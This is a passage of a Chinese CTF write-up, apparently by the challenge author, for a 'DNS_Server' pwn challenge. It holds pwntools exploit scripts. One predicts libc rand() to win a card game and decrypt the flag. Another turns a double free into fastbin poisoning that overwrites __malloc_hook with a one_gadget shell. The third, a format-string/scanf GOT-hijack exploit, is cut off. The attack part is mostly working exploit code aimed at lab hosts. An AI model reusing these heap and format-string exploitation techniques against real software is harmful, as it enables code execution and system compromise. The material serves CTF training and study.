class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">last = list()</span><br><span class="line"></span><br><span class="line">ori = <span class="number">-1</span></span><br><span class="line">elf = ELF(<span class="string">'./DNS_Server'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	libc=CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">	libc.srand(libc.time(<span class="number">0</span>)/<span class="number">60</span>)</span><br><span class="line">	p= process(<span class="string">'./DNS_Server'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	<span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">	<span class="comment">#gdb.attach(p,'b set_motto\nb set_name')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'172.16.20.11'</span>,  <span class="number">2111</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randcard</span><span class="params">(dealer)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> last,ori</span><br><span class="line">	<span class="keyword">if</span> len(last)&gt;<span class="number">0</span>:</span><br><span class="line">		num = last[<span class="number">0</span>]%<span class="number">13</span>+<span class="number">1</span></span><br><span class="line">		last = last[<span class="number">1</span>:]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		ori = libc.rand()</span><br><span class="line">		num = ori%<span class="number">13</span>+<span class="number">1</span></span><br><span class="line">		</span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">if</span> num &gt;= <span class="number">12</span>:</span><br><span class="line">		num = <span class="number">10</span></span><br><span class="line">	<span class="keyword">elif</span> num == <span class="number">11</span>:</span><br><span class="line">		<span class="keyword">if</span> dealer&lt;=<span class="number">10</span>:</span><br><span class="line">			num = <span class="number">11</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			num = <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		num = num</span><br><span class="line">	<span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> ori</span><br><span class="line">	player = <span class="number">0</span></span><br><span class="line">	dealer = <span class="number">0</span></span><br><span class="line">	player_flag = <span class="number">0</span></span><br><span class="line">	dealer_flag = <span class="number">0</span>	</span><br><span class="line">	Hit = <span class="number">0</span></span><br><span class="line">	Stay = <span class="number">0</span></span><br><span class="line">	getrand()<span class="comment">#,last</span></span><br><span class="line">	player+=randcard(player)</span><br><span class="line">	<span class="comment">#print '--'</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your Total is '</span>)</span><br><span class="line">	tmp =int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">	<span class="keyword">if</span> (tmp!= player):</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'[-] rand num1 wrong !with %d vs %d'</span>%(tmp,player)</span><br><span class="line">		exit(<span class="number">0</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'The Dealer Has a Total of '</span>)</span><br><span class="line">	dealer+=randcard(dealer)	</span><br><span class="line">	tmp =int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">	<span class="keyword">if</span> (tmp!= dealer):</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'[-] rand num2 wrong !%d vs %d'</span>%(tmp,dealer)</span><br><span class="line">		exit(<span class="number">0</span>)	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> player == <span class="number">21</span>:</span><br><span class="line">			<span class="comment">#print '[+++]1 d,p',dealer,player,last		</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>,Hit,Stay</span><br><span class="line">		<span class="keyword">if</span> player&lt;=<span class="number">21</span>:</span><br><span class="line">			<span class="keyword">if</span> player_flag!=<span class="number">1</span>:</span><br><span class="line">				card_type = getrand()</span><br><span class="line">				card_num  = randcard(player)</span><br><span class="line">				<span class="keyword">if</span> (player + card_num )&lt;=<span class="number">21</span>:</span><br><span class="line">					player+=card_num</span><br><span class="line">					Hit +=<span class="number">1</span></span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					last.append(card_type)</span><br><span class="line">					last.append(ori)</span><br><span class="line">					player_flag =<span class="number">1</span></span><br><span class="line">					Stay = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> dealer&lt;<span class="number">17</span>:</span><br><span class="line">					dealer += randcard(dealer)</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> dealer==<span class="number">21</span>:</span><br><span class="line">					<span class="comment">#print '[+++]2 d,p',dealer,player,last	</span></span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>,Hit,Stay</span><br><span class="line">				<span class="keyword">if</span> dealer&gt;<span class="number">21</span>:</span><br><span class="line">					<span class="comment">#print '[+++]3 d,p',dealer,player	,last	</span></span><br><span class="line">					<span class="keyword">return</span> <span class="number">1</span>,Hit,Stay</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">if</span> dealer&lt;<span class="number">17</span>:</span><br><span class="line">					dealer += randcard(dealer)</span><br><span class="line">				<span class="keyword">if</span> dealer&gt;=<span class="number">17</span>:</span><br><span class="line">					<span class="keyword">if</span> player&gt;=dealer:</span><br><span class="line">						<span class="comment">#print '[+++]4 d,p',dealer,player	,last	</span></span><br><span class="line">						<span class="keyword">return</span> <span class="number">1</span>,Hit,Stay</span><br><span class="line">					<span class="keyword">if</span> player&lt;dealer:</span><br><span class="line">						<span class="comment">#print '[+++]5 d,p',dealer,player	,last	</span></span><br><span class="line">						<span class="keyword">return</span> <span class="number">0</span>,Hit,Stay</span><br><span class="line">					<span class="keyword">if</span> dealer&gt;<span class="number">21</span>:</span><br><span class="line">						<span class="comment">#print '[+++]6 d,p',dealer,player	,last</span></span><br><span class="line">						<span class="keyword">return</span> <span class="number">1</span>,Hit,Stay</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment"># (p.recvuntil(Your Total is ))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrand</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> last_two,last</span><br><span class="line">	<span class="keyword">if</span> len(last)&gt;<span class="number">0</span>:</span><br><span class="line">		num = last[<span class="number">0</span>]</span><br><span class="line">		last = last[<span class="number">1</span>:]</span><br><span class="line">		<span class="comment">#print '[***]',last</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		num = libc.rand()</span><br><span class="line">	<span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">win = <span class="number">0</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xbabe</span>))	</span><br><span class="line">p.recvuntil(<span class="string">'Y/N'</span>)</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	<span class="string">'''</span></span><br><span class="line"><span class="string">	if win&gt;=6:</span></span><br><span class="line"><span class="string">		p.recvuntil('flag :')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		flag = p.recv()</span></span><br><span class="line"><span class="string">		flag_decrypt = ""</span></span><br><span class="line"><span class="string">		for i in range(len(flag)):</span></span><br><span class="line"><span class="string">			flag_decrypt += chr((getrand()%256)^ord(flag[i]))</span></span><br><span class="line"><span class="string">		print flag_decrypt</span></span><br><span class="line"><span class="string">		exit(0)</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">")b"</span> <span class="keyword">in</span> p.recvuntil(<span class="string">":"</span>):</span><br><span class="line">		p.recvuntil(<span class="string">'flag :\n'</span>)</span><br><span class="line">		flag = p.recv()</span><br><span class="line">		flag_decrypt = <span class="string">""</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">			flag_decrypt += chr((getrand()%<span class="number">256</span>)^ord(flag[i]))</span><br><span class="line">		<span class="keyword">print</span> flag_decrypt</span><br><span class="line">		exit(<span class="number">0</span>)		</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">' $'</span>)</span><br><span class="line">	money = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">	result,hit,stay = round()</span><br><span class="line">	<span class="keyword">if</span> result :</span><br><span class="line">		p.recvuntil(<span class="string">"$"</span>)</span><br><span class="line">		p.sendline(str(money))</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,hit):</span><br><span class="line">			p.recvuntil(<span class="string">"Please Enter H to Hit or S to Stay."</span>)</span><br><span class="line">			p.sendline(<span class="string">"H"</span>)</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,stay):</span><br><span class="line">			p.recvuntil(<span class="string">"Please Enter H to Hit or S to Stay."</span>)</span><br><span class="line">			p.sendline(<span class="string">"S"</span>)			</span><br><span class="line">		<span class="comment">#win+=1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.recvuntil(<span class="string">"$"</span>)</span><br><span class="line">		p.sendline(str(<span class="number">1</span>))</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,hit):</span><br><span class="line">			p.recvuntil(<span class="string">"Please Enter H to Hit or S to Stay."</span>)</span><br><span class="line">			p.sendline(<span class="string">"H"</span>)</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,stay):</span><br><span class="line">			p.recvuntil(<span class="string">"Please Enter H to Hit or S to Stay."</span>)</span><br><span class="line">			p.sendline(<span class="string">"S"</span>)			</span><br><span class="line">	p.recvuntil(<span class="string">'Please Enter Y for Yes or N for No\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><p>题目中有一个增加DNS和删除DNS的功能，在删除功能中按照domain名进行查找并Free，但仅把最后一个DNS节点指针置空，因此，两次Delete会造成Double Free。但是题目中我设置了一个坑点，在于DNS节点Free以前会检查是否是当前用户释放的，也就是name字段，当简单的double free时，由于fd指针位置已经被置为某地址了，所以不能通过检查而释放，此时发现检查字段用的是strcmp来比较的，将name字段设置为‘\x00’*7即可通过检查。比较简单的libc泄露地址方法是用unsorted bin未清空来做，泄露main_arena+88这个地址。以后的方法是常规套路：将Double Free转换为UAF，形成循环链表，劫持长度为0x70的fastbin链到__malloc_hook-0x30，以one_gadget覆写__malloc_hook，在申请堆块时候触发malloc从而拿到shell。</p>
<p><strong>另外，堆漏洞由于我写错了一个函数，出现了一个堆溢出漏洞，膜一发以非预期解法解出题目的师傅</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./DNS_Server'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./DNS_Server'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'172.16.20.11'</span>,  <span class="number">2111</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(domain,length,remark,ip)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">	p.sendline(domain)</span><br><span class="line">	p.recvuntil(<span class="string">"length"</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">	p.sendline(remark)</span><br><span class="line">	p.recvuntil(<span class="string">"IP:"</span>)</span><br><span class="line">	p.send(ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(domain)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">	p.sendline(domain)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(domain)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">	p.sendline(domain)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">	add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">	add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))	</span><br><span class="line">	add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">	add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))	</span><br><span class="line">	add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">	add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))	</span><br><span class="line">	delete(<span class="string">"leak"</span>)	</span><br><span class="line">	show(<span class="string">"leak"</span>)</span><br><span class="line"></span><br><span class="line">leak()</span><br><span class="line">p.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">libc.address  = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">heap =u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] heap:'</span>,hex(heap)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name"</span>)</span><br><span class="line">p.sendline(<span class="string">'\0'</span>*<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))	</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="string">"step1"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'1'</span>))</span><br><span class="line">add(<span class="string">"step1"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'1'</span>))</span><br><span class="line">delete(<span class="string">"step1"</span>)</span><br><span class="line">delete(<span class="string">"step1"</span>)</span><br><span class="line">delete(<span class="string">"leak"</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="string">"step2"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,(p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)+<span class="string">"..."</span>).ljust(<span class="number">0x20</span>,<span class="string">'1'</span>))</span><br><span class="line">add(<span class="string">"step3"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'3'</span>))</span><br><span class="line">add(<span class="string">"step3"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'3'</span>))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="string">"step4"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,(<span class="string">"\0"</span>*<span class="number">0x13</span>+p64(libc.address +<span class="number">0x4526a</span> )+<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'0'</span>)))</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216	execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a	execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4	execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147	execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<h2 id="格式化字符串大礼包"><a href="#格式化字符串大礼包" class="headerlink" title="格式化字符串大礼包"></a>格式化字符串大礼包</h2><p>在set_name函数中有一个明显的格式化字符串漏洞，这个漏洞很多队伍拿来做地址泄露了，实际上也是可用的。首先七个字节，可用来写本函数中的rbp，向该位置用%hn写2字节\x00。在写完之后，在login函数的栈就被迁移到原来的栈的低地址位置了，而在set_motto函数中可以对这部分内存预先设置一下，可以达到控制scanf格式化字符串的目的，将这个格式化字符串劫持到堆上去，泄露堆地址的方法与Double Free中泄露方法是一致的，达到控制格式化字符串以后，需要考虑如何将scanf的格式化字符串用好。与格式化字符串在堆或bss段上的printf格式化字符串利用思路类似，可以在栈上先找一个地址链，向第一个地址写入，再对第二个地址写入，从而达到任意地址写，最终劫持puts@got 为system，以show_motto函数触发漏洞就可以拿到shell了。</p>
<p>利用流程是：以堆泄露libc、堆地址-&gt;在堆上预先布置好scanf格式化字符串-&gt;以set_motto预先布置好栈上数据-&gt;调用set_name对login函数做栈迁移-&gt;利用login函数的scanf写got表-&gt;触发show_motto函数拿到shell</p>
<p><strong><em>这个就是一个简化版本的胖哈勃题目，出在这里想看一下有什么解法是我非预期的，当时线下赛的时候没有人用这个方法来做，还是没有想到上面提到的那个劫持返回地址…</em></strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./DNS_Server'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./DNS_Server'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	gdb.attach(p,<span class="string">'b set_motto\nb set_name'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'172.16.20.17'</span>,  <span class="number">40111</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(domain,length,remark,ip)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">	p.sendline(domain)</span><br><span class="line">	p.recvuntil(<span class="string">"length"</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">	p.sendline(remark)</span><br><span class="line">	p.recvuntil(<span class="string">"IP:"</span>)</span><br><span class="line">	p.send(ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 